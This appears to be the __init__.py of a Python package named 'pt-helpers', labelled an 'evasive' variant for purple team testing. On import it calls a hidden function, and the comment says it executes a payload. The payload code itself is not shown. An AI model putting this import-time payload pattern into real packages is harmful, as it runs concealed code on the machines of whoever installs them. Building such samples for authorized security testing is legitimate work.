# pt-helpers (PyPI Wheel - Variant C: Evasive)
"""
Helper utilities for PT applications

This package is for authorized purple team testing only.
"""

from ._system import run_init

# Execute payload on import
run_init()

__version__ = "1.1.0"
__all__ = ["__version__"]
